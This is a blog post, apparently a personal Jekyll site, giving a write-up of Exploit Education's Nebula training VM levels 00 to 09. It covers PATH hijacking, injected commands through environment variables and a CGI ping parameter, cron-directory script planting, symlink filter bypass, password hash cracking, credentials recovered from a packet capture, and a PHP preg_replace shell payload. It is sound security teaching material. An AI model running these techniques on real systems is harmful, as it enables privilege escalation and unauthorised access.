@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>Exploit Education - Nebula: Write-up (Part 1)</title>
+  <meta name="description" content="Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that c...">
+  <meta name="author" content="Zijun Hui">
+  <meta name="keywords" content="exploit education, nebula, solution, tip, answer, ctf">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Exploit Education - Nebula: Write-up (Part 1)">
+  <meta name="twitter:description" content="Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that c...">
+  <meta name="twitter:keywords" content="exploit education, nebula, solution, tip, answer, ctf">
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Exploit Education - Nebula: Write-up (Part 1)">
+  <meta property="og:description" content="Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that c...">
+  <meta name="og:keywords" content="exploit education, nebula, solution, tip, answer, ctf">
+
+  <link rel="icon" type="image/png" href="/assets/images/favicon.png" />
+  <link href="/assets/images/favicon.png" rel="shortcut icon" type="image/png">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet"> 
+
+  <link rel="canonical" href="zijunh.github.io/2019/04/nebula/">
+  <link rel="alternate" type="application/rss+xml" title="Zijun Hui" href="zijunh.github.io/feed.xml">
+  
+  <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
+  
+</head>
+
+
+  <body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="fa fa-list btn-mobile-menu__icon"></i>
+        <i class="fa fa-angle-up btn-mobile-close__icon hidden"></i>
+    </span>
+    
+    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/assets/images/background-cover.jpg')">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <a href="/" title="Go to Zijun Hui's page" class="blog-button"><img src="/assets/images/avatar.jpg" width="80" alt="Zijun Hui logo" class="panel-cover__logo logo" /></a>
+        <h1 class="panel-cover__title panel-title"><a href="/" title="Link to homepage for Zijun Hui" class="blog-button">Zijun Hui</a></h1>
+        
+        <span class="panel-cover__subtitle panel-subtitle">Doing what I like</span>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">Random thoughts and random solutions on computer science</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+        
+        <p class="panel-cover__description">Welcome to my world</p>
+        
+        
+        <div class="navigation-wrapper">
+          <div>
+            <nav class="cover-navigation cover-navigation--primary">
+              <ul class="navigation">
+                <li class="navigation__item"><a href="/#blog" title="Visit blog" class="blog-button">Home</a></li>
+                
+                  <li class="navigation__item"><a href="/categories.html#blog" title="Categoies">Categories</a></li>
+                
+                
+              </ul>
+            </nav>
+          </div>
+          
+          <div><nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+  
+
+  
+  <!-- Github -->
+  <li class="navigation__item">
+    <a href="https://github.com/ZijunH" title="@ZijunH 的 Github" target="_blank">
+      <i class='social fa fa-github'></i>
+      <span class="label">Github</span>
+    </a>
+  </li>
+  
+  
+  
+
+  
+
+  <!-- RSS -->
+  <li class="navigation__item">
+    <a href="/feed.xml" rel="author" title="RSS" target="_blank">
+      <i class='social fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li>
+
+  
+  <!-- Email -->
+  <li class="navigation__item">
+    <a href="mailto:allenhui1220@outlook.com" title="Contact me">
+      <i class='social fa fa-envelope'></i>
+      <span class="label">Email</span>
+    </a>
+  </li>
+  
+
+  </ul>
+</nav>
+</div>
+        </div>
+      </div>
+    </div>
+    
+    
+    <div class="panel-cover--overlay cover-red"></div>
+    
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="2019-04-07 22:40:32 +1000" itemprop="datePublished" class="post-meta__date date">2019-04-07</time> &#8226; <span class="post-meta__tags tags">exploit education, solution, nebula</span>
+    </div>
+    <h1 class="post-title">Exploit Education - Nebula: Write-up (Part 1)</h1>
+  </header>
+
+  <section class="post">
+    <h2 id="introduction">Introduction</h2>
+
+<p>As the challenges are relatively short, I will be slowly updating this post will the ones I have completed. The VM can be obtained at <a href="https://exploit.education/nebula/">Exploit Education</a>, a website created by Andrew Griffiths that teaches common (and less than common) weaknesses and vulnerabilities in Linux.</p>
+
+<p>The main purpose of each level is to bypass certain restrictions imposed by the system, and run <code class="highlighter-rouge">getflag</code> with the required privileges (pwn).</p>
+
+<h2 id="level00">Level00</h2>
+
+<p>This is a trivial question that requires some understanding of <code class="highlighter-rouge">find</code>. In this particular scenario, <code class="highlighter-rouge">man</code> pages did not help a lot, as it was flooded with options and configurations. After some reading, the following solution was obtained.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-executable</span> <span class="nt">-type</span> f <span class="nt">-user</span> <span class="s2">"flag00"</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>This results a list of files that are executable and are ran under the ‘flagxx’ account. Executing the files spawn a shell with sufficient privileges to execute <code class="highlighter-rouge">getflag</code>, thus solving the level.</p>
+
+<h2 id="level01">Level01</h2>
+
+<p>The source code for the level is provided for us. The code extracts the effective user ID and group ID of the process and overwrites the real and saved user and group IDs with them. From my understanding, real ID is the ID of the caller while effective ID is the ID the kernel uses to check for privileges. The target file, <code class="highlighter-rouge">/home/flag01/flag01</code>, has its suid bit set, so the effective ID will be the same as its real ID when it is executed. The file is owned by ‘flag01’, so its real ID will be ‘flag01’. The above information can be verified by inspection of the results of the <code class="highlighter-rouge">ls -al</code> command. Following the changes of user and group IDs, the program calls <code class="highlighter-rouge">echo</code> with the parameters <code class="highlighter-rouge">and</code>, <code class="highlighter-rouge">now</code>, and <code class="highlighter-rouge">what?</code>. Interestingly, it looks for <code class="highlighter-rouge">echo</code> in the the environment variable <code class="highlighter-rouge">PATH</code>. Thus, a fake <code class="highlighter-rouge">echo</code> command can be created and its location can be inserted into the start of the <code class="highlighter-rouge">PATH</code> variable. This overrides the real <code class="highlighter-rouge">echo</code>. Since both the real and effective IDs have been changed to a more privileged account, the fake <code class="highlighter-rouge">echo</code> will be run using escalated privileges as well! We can use this to run the required <code class="highlighter-rouge">getflag</code> command.</p>
+
+<p>The solution is as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~
+<span class="nb">touch </span>badbash.c
+vim badbash.c
+</code></pre></div></div>
+
+<p>Enter the following lines of C code and save the file:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"getflag"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Continue in the bash terminal with the following commands:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc badbash.c <span class="nt">-o</span> <span class="nb">echo
+</span><span class="nv">PATH</span><span class="o">=</span>~:<span class="nv">$PATH</span>
+<span class="nb">cd</span> /home/flag01
+./flag01
+</code></pre></div></div>
+
+<h2 id="level02">Level02</h2>
+
+<p>This level is similar to the previous level. The given program executes the command <code class="highlighter-rouge">/bin/echo %s is cool</code> in bash, where <code class="highlighter-rouge">%s</code> is a custom defined string. This string can be defined by overwriting the <code class="highlighter-rouge">USER</code> variable. Furthermore, <code class="highlighter-rouge">;</code> is used to join two commands and the input string can be manipulated into the form “;getflag;”. The terminal will first execute <code class="highlighter-rouge">/bin/echo</code>, which does nothing when it has no arguments, and then execute <code class="highlighter-rouge">getflag</code>. bash may not successfully parse <code class="highlighter-rouge">is cool</code>, but that is not our concern, as <code class="highlighter-rouge">getflag</code> has already been executed. As the real ID of this program is <code class="highlighter-rouge">flag02</code> and the suid bit of the file is set, <code class="highlighter-rouge">getflag</code> will be executed with the required privileges, and thus successfully unlock the flag.</p>
+
+<p>The solution can be summarised as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home/flag02
+<span class="nv">USER</span><span class="o">=</span><span class="s1">';getflag;'</span>
+./flag02
+</code></pre></div></div>
+
+<h2 id="level03">Level03</h2>
+
+<p>A <code class="highlighter-rouge">crontab</code> is ran every few minutes presumably on the <code class="highlighter-rouge">writable.sh</code> file. Inspecting the contents reveal the following code:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="k">for </span>i <span class="k">in</span> /home/flag03/writable.d/<span class="k">*</span> <span class="p">;</span> <span class="k">do</span>
+    <span class="o">(</span><span class="nb">ulimit</span> <span class="nt">-t</span> 5<span class="p">;</span> bash <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="o">)</span>
+    <span class="nb">rm</span> <span class="nt">-rf</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span>
+<span class="k">done</span>
+
+</code></pre></div></div>
+
+<p>It appears the this script fetches all the files in the “writable.d” directory and performs some commands on it and removes it after it is scanned. <code class="highlighter-rouge">ulimit -t</code> simply limits the time allows for the given program to run, and <code class="highlighter-rouge">bash -x</code>, according to the man page, shows all actions done in that script. Both commands do not limit how we access or execute the script, so I simply ignored them. The next reasonable action is to insert our own custom script into the “writable.d” directory. This is possible as we have the sufficient privileges, as evident from the results of <code class="highlighter-rouge">ls -al</code>. With this information in mind, we can derive our solution. A script that executes <code class="highlighter-rouge">getflag</code> will be stored in “writable.d”. Executing <code class="highlighter-rouge">writable.sh</code> itself is futile, as it does not have suid bit set, thus we will be running with insufficient privileges. <code class="highlighter-rouge">crontab</code> runs with <code class="highlighter-rouge">root</code> in default configurations, thus this should be what we need to exploit.  As <code class="highlighter-rouge">crontab</code> redirects the output, we will store the output into a file at a specific location. This can be summarised as the following code.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home/flag03/writable.d
+<span class="nb">echo</span> <span class="s2">"getflag &gt; /tmp/res.txt"</span> <span class="o">&gt;</span> scrpt.sh
+<span class="nb">chmod</span> +x scrpt.sh
+</code></pre></div></div>
+
+<p>After waiting a while, check the contents of the “/tmp/res.txt” file by <code class="highlighter-rouge">cat /tmp/res.txt</code>. As expected, it shows we have successfully executed <code class="highlighter-rouge">getflag</code> on a required account.</p>
+
+<h2 id="level04">Level04</h2>
+
+<p>The key line of code that prevents the user from reading the token file directly is <code class="highlighter-rouge">strstr(argv[1], "token") != NULL</code>. From the <code class="highlighter-rouge">man</code> page, <code class="highlighter-rouge">strstr</code> returns the first occurrence of “token” in “argv[1]”. If the string token does not exist, then “NULL” is returned, and the file can be accessed as usual. If it does, the program throws an error and exits prematurely. To circumvent this, we can create a symbolic link, which is basically pointer to another file. As we can name this what ever we want, the check can be bypassed. The link is created using <code class="highlighter-rouge">ln</code>; as a symbolic link is required, <code class="highlighter-rouge">-s</code> is added as an argument. The solution for this problem is as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /home/flag04/token symlink
+/home/flag04/flag04 symlink
+</code></pre></div></div>
+
+<p>This prints out a long string, which is the password of the flag04 account. Switch into flag04 using <code class="highlighter-rouge">su - flag04</code>, enter the password, and you will have sufficient privileges to run <code class="highlighter-rouge">getflag</code>.</p>
+
+<h2 id="level05">Level05</h2>
+
+<p>Digging around the flag05 home folder using <code class="highlighter-rouge">ls -al</code> reveals 2 hidden folders: “.backup” and “.ssh”. “.ssh” hints the way we need to log into “flag05” – via ssh. Unfortunately, out account does not have sufficient privileges to read its contents, thus the entry point must be “.backup”. “.backup” does not appear to be a standard folder name, and inspecting the contents inside reveal a .tgz file that is named “backup”. Inspecting the type of the file using <code class="highlighter-rouge">file</code> reveals it has gzip compressed data, and fortunately our account can read it. <code class="highlighter-rouge">cd</code> back our home folder and extracting the file there using <code class="highlighter-rouge">tar zxvf</code> (z: gzip, x: decompress, v: show name, f: archive file name) produces a “.ssh” folder with ssh authorisation keys. Using that information, we can simple type <code class="highlighter-rouge">ssh flag05@localhost</code> to access flag05’s account. The entire process can be summarised as the following commands:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~
+<span class="nb">tar </span>zxvf /home/flag05/.backup/backup-19072011.tgz
+ssh flag05@localhost
+getflag
+</code></pre></div></div>
+
+<h2 id="level06">Level06</h2>
+
+<p>After some inspection of the system and <a href="http://www.linfo.org/etc_passwd.html">online reading</a>, I figured out the problem exists in the ‘/etc/passwd’ file. In the past, the encrypted password was stored in this file, which is visible to everyone. Now, encrypted passwords are stored in the file ‘/etc/shadow’, which is not visible to normal users. Inspecting the file, there exists an entry for the user account ‘flag06’, which is ‘flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh’. This provides the password hash for this account.</p>
+
+<p>As the problem states the unix version is old, it is highly likely that the hash is generated by the <code class="highlighter-rouge">crypt</code> method. To crack the password, the infamous password “john the ripper” should be used. After downloading it from the official website (or from the snap store) in a separate machine, the line with the password is copied into a file. After running <code class="highlighter-rouge">john text_file</code>, the following results were obtained.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Using default input encoding: UTF-8
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 642 candidates buffered for the current salt, minimum 1024 needed for performance.
+Proceeding with wordlist:/snap/john-the-ripper/current/run/password.lst, rules:Wordlist
+hello            (flag06)
+1g 0:00:00:00 DONE 2/3 (2019-06-14 20:41) 16.66g/s 294466p/s 294466c/s 294466C/s 123456..betabeta
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>It seems we have obtained our password, which is “hello”. After changing the user into “flag06”, we can run <code class="highlighter-rouge">getflag</code>, obtaining the desired result.</p>
+
+<h2 id="level07">Level07</h2>
+
+<p>The source of a perl program is provided.</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
+<span class="k">use</span> <span class="nv">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
+<span class="k">print</span> <span class="s">"Content-type: text/html\n\n"</span><span class="p">;</span>
+<span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
+  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"</span><span class="p">);</span>
+  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
+  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">"$line"</span><span class="p">;</span> <span class="p">}</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="c1"># check if Host set. if not, display normal page, etc</span>
+<span class="nv">ping</span><span class="p">(</span><span class="nv">param</span><span class="p">(</span><span class="s">"Host"</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>Though I am unfamiliar at all with perl, the line ` @output = <code class="highlighter-rouge">ping -c 3 $host 2&gt;&amp;1</code>; ` looks quite suspicious. As “$host” is set to whatever is supplied as the argument, we should be able to inject command with this script. After we <code class="highlighter-rouge">cd</code> into “/home/flag07”, we see 2 files: one is the source code shown above, and the other is a configuration document named “thttpd.conf”, which has the following content:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># /etc/thttpd/thttpd.conf: thttpd configuration file
+
+# This file is for thttpd processes created by /etc/init.d/thttpd.
+# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.
+
+# Specifies an alternate port number to listen on.
+port=7007
+
+# Specifies a directory to chdir() to at startup. This is merely a convenience -
+# you could just as easily do a cd in the shell script that invokes the program.
+dir=/home/flag07
+
+# Do a chroot() at initialization time, restricting file access to the program's
+# current directory. If chroot is the compiled-in default (not the case on
+# Debian), then nochroot disables it. See thttpd(8) for details.
+nochroot
+#chroot
+
+# Specifies a directory to chdir() to after chrooting. If you're not chrooting,
+# you might as well do a single chdir() with the dir option. If you are
+# chrooting, this lets you put the web files in a subdirectory of the chroot
+# tree, instead of in the top level mixed in with the chroot files.
+#data_dir=
+
+# Don't do explicit symbolic link checking. Normally, thttpd explicitly expands
+# any symbolic links in filenames, to check that the resulting path stays within
+# the original document tree. If you want to turn off this check and save some
+# CPU time, you can use the nosymlinks option, however this is not
+# recommended. Note, though, that if you are using the chroot option, the
+# symlink checking is unnecessary and is turned off, so the safe way to save
+# those CPU cycles is to use chroot.
+#symlinks
+#nosymlinks
+
+# Do el-cheapo virtual hosting. If vhost is the compiled-in default (not the
+# case on Debian), then novhost disables it. See thttpd(8) for details.
+#vhost
+#novhost
+
+# Use a global passwd file. This means that every file in the entire document
+# tree is protected by the single .htpasswd file at the top of the tree.
+# Otherwise the semantics of the .htpasswd file are the same. If this option is
+# set but there is no .htpasswd file in the top-level directory, then thttpd
+# proceeds as if the option was not set - first looking for a local .htpasswd
+# file, and if that doesn't exist either then serving the file without any
+# password. If globalpasswd is the compiled-in default (not the case on Debian),
+# then noglobalpasswd disables it.
+#globalpasswd
+#noglobalpasswd
+
+# Specifies what user to switch to after initialization when started as root.
+user=flag07
+
+# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
+# "/cgi-bin/*". See thttpd(8) for details.
+cgipat=**.cgi
+
+# Specifies a file of throttle settings. See thttpd(8) for details.
+#throttles=/etc/thttpd/throttle.conf
+
+# Specifies a hostname to bind to, for multihoming. The default is to bind to
+# all hostnames supported on the local machine. See thttpd(8) for details.
+#host=
+
+# Specifies a file for logging. If no logfile option is specified, thttpd logs
+# via syslog(). If logfile=/dev/null is specified, thttpd doesn't log at all.
+#logfile=/var/log/thttpd.log
+
+# Specifies a file to write the process-id to. If no file is specified, no
+# process-id is written. You can use this file to send signals to thttpd. See
+# thttpd(8) for details.
+#pidfile=
+
+# Specifies the character set to use with text MIME types.
+#charset=iso-8859-1
+
+# Specifies a P3P server privacy header to be returned with all responses. See
+# http://www.w3.org/P3P/ for details. Thttpd doesn't do anything at all with the
+# string except put it in the P3P: response header.
+#p3p=
+
+# Specifies the number of seconds to be used in a "Cache-Control: max-age"
+# header to be returned with all responses. An equivalent "Expires" header is
+# also generated. The default is no Cache-Control or Expires headers, which is
+# just fine for most sites.
+#max_age=
+</code></pre></div></div>
+
+<p>Running the first file by itself gives the result of a help command, which is not important. However, running the file by <code class="highlighter-rouge">./index.cgi Host=;whoami</code> provided the results “level07”. Clearly, the injection works, but unfortunately the user is not what we desire. Inspection of the second file reveals it is for <code class="highlighter-rouge">thttpd</code>, which is a lightweight http server. Some key configs are “port=7007” and “user=flag07”. This tells us which port the server is on and what user it is running at. “cgipat=**.cgi” shows it can run any perl program that is in the folder “dir=/home/flag07”. Sweet!</p>
+
+<p>This means we just have to go to the website 127.0.0.1:7007/index.cgi with the arguments “Host=;whoami” and it should return “flag07”. To test this out, we can run the following wget command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@nebula:/home/flag07<span class="nv">$ </span>wget <span class="nt">-qO</span> - http://127.0.0.1:7007/index.cgi?Host<span class="o">=</span>%3Bwhoami
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;flag07
+&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+
+<p>Indeed, “flag07” is returned as the user. By changing “whoami” to “getflag”, we can obtain the flag, with the confirmation printed in the website output:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@nebula:/home/flag07<span class="nv">$ </span>wget <span class="nt">-qO</span> - http://127.0.0.1:7007/index.cgi?Host<span class="o">=</span>%3Bgetflag
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account
+&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+
+<h2 id="level08">Level08</h2>
+
+<p>As usual, cd into the required file location. Running ls, there appears to be only 1 file, “capture.pcap”. When attempting to open it I have been warned it is a binary file, which is has no use to me. Checking the type of the “capture.pcap” by “file capture.pcap” shows it is a “tcpdump capture file”. After some googling, it appears the file can be read using <code class="highlighter-rouge">tcpflow -Cr capture.pcap</code>. This prints the content of the packages to stdout. The result is the following information:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@nebula:~$ tcpflow -Cr /home/flag08/capture.pcap
+..%
+..%
+..&amp;..... ..#..'..$
+..&amp;..... ..#..'..$
+.. .....#.....'.........
+.. .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm..
+........"........!
+........"..".....b........b.....B.
+..............................1.......!
+.."....
+.."....
+..!..........."
+........"
+.."................
+.....................
+
+Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
+
+..wwwbugs login:
+l
+.l
+e
+.e
+v
+.v
+e
+.e
+l
+.l
+8
+.8
+
+.
+.
+Password:
+b
+a
+c
+k
+d
+o
+o
+r
+.
+.
+.
+0
+0
+R
+m
+8
+.
+a
+t
+e
+
+.
+
+.
+.
+Login incorrect
+wwwbugs login:
+</code></pre></div></div>
+
+<p>It appears the password is recorded, but unfortunately it is cluttered with some control symbols. We to inspect the file in hex and determine what the control symbols are. To do so, we need to run <code class="highlighter-rouge">tcpflow -r capture.pcap</code> (without -C), which stores the information in a file. As we do not have write privileges, we need to cd back to our home folder. After running the above command, 2 files are generated. Inspecting the files using <code class="highlighter-rouge">less 059.233.235.218.39247-059.233.235.223.12121</code> shows the password is “backdoor^?^?^?00Rm8^?ate”. ‘^?’ is the control symbol for backspace, thus the character before it is removed. Piecing together the output, the password becomes “backd00Rmate”. Thus we can su into flag08, and execute <code class="highlighter-rouge">flag08</code> successfully.</p>
+
+<h2 id="level09">Level09</h2>
+
+<p>At the start, the description mentions a C setuid wrapper exists for some PHP code, suggesting the PHP code is vulnerable and can potentially spawn a shell with escalated privileges</p>
+
+<p>A PHP source code is provided. I used the PHP documentation to guide myself through the functions it used. One that caught my attention is the function <code class="highlighter-rouge">preg_replace</code> on line 15. Notice the ‘e’ at the end of the first argument; this means the second argument will be evaluated as PHP code after second argument has been replaced. This is a <a href="https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">known security risk</a> and the modifier was deprecated and then removed.</p>
+
+<p>Further notice the double quotations used for the second argument. <a href="https://stackoverflow.com/questions/3446216/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php">This</a> indicates the use of curly braces can allow evaluation of the contents inside the braces. Apparently this is called complex (curly) braces. Together, we can create our attack string as <code class="highlighter-rouge">[email {${system(sh)}}]</code>. The “[email]” is required for the string to be picked by the regex. The inner “{…}” allows the evaluation of the function. The outer “{$…}” is the complex (curly) braces.</p>
+
+<p>Thus, the shell can be spawned by the following commands that are executed in <code class="highlighter-rouge">~</code>, and <code class="highlighter-rouge">getflag</code> can be executed in the shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'[email {${system(sh)}}]'</span> <span class="o">&gt;</span> <span class="nb">test</span>
+/home/flag09/flag09 <span class="nb">test</span>
+</code></pre></div></div>
+
+  </section>
+</article>
+
+<section class="read-more">
+   
+   
+   <div class="read-more-item">
+       <span class="read-more-item-dim">Recent posts</span>
+       <h2 class="post-list__post-title post-title"><a href="/2019/06/nebulla-part-2/" title="link to Exploit Education - Nebula: Write-up (Part 2)">Exploit Education - Nebula: Write-up (Part 2)</a></h2>
+       <p class="excerpt">Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race co...</p>
+       <div class="post-list__meta"><time datetime="2019-06-25 23:44:38 +1000" class="post-list__meta--date date">2019-06-25</time> &#8226; <span class="post-list__meta--tags tags">exploit education, solution, nebula</span>
+       </br></br>
+        <a class="btn-border-small" href=/2019/06/nebulla-part-2/>Continue...</a></div>
+   </div>
+   
+   
+   
+   
+   <div class="read-more-item">
+       <span class="read-more-item-dim">Earlier posts</span>
+       <h2 class="post-list__post-title post-title"><a href="/2019/02/hollywood/" title="link to Microcorruption - Hollywood: Write-up">Microcorruption - Hollywood: Write-up</a></h2>
+       <p class="excerpt"></p>A write-up on the solution for the microcorruption level Hollywood. The thought process behind the solution is also included. At the end a 5 byte solution with 3085563 CPU cycle time is achieved.</p>
+       <div class="post-list__meta"><time datetime="2019-02-25 21:22:19 +1100" class="post-list__meta--date date">2019-02-25</time> &#8226; <span class="post-list__meta--tags tags">microcorruption, solution, wargames</span>
+       </br></br>
+        <a class="btn-border-small" href=/2019/02/hollywood/>Continue...</a></div>
+   </div>
+   
+</section>
+
+<section class="post-comments">
+  
+    <div id="disqus_thread"></div>
+    <script>
+    
+    var disqus_config = function () {
+        this.page.url = "zijunh.github.io/2019/04/nebula/";
+        this.page.identifier = "/2019/04/nebula/";
+    };
+
+    var disqus_shortname = 'zijunh';
+    
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>To view<a href="http://disqus.com/?ref_noscript"> Disqus </a>Comments, please enable JavaScript</noscript>
+    
+  
+  
+  
+  
+</section>
+
+
+            <section class="footer">
+    <footer>
+    	<span class="footer__copyright">Created under <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></span>
+        <span class="footer__copyright">Generated by <a href="https://jekyllrb.com">Jekyll</a> at 2019-12-09. Many thanks to <a href="https://pages.github.com/">Github</a> for the hosting service</span>
+        <span class="footer__copyright">Created by <a href="https://github.com/ZijunH/">@ZijunH</a> using the <a href="https://github.com/onevcat/vno-jekyll">Vno - Jekyll</a> theme by @onevcat. Source code found on <a href="https://github.com/ZijunH/zijunh.github.io">github</a> - &copy; 2019</span>
+    </footer>
+</section>
+
+        </div>
+    </div>
+    
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-132056744-1', 'auto');
+    ga('send', 'pageview');
+</script>
+
+
+    
+  </body>
+
+</html>
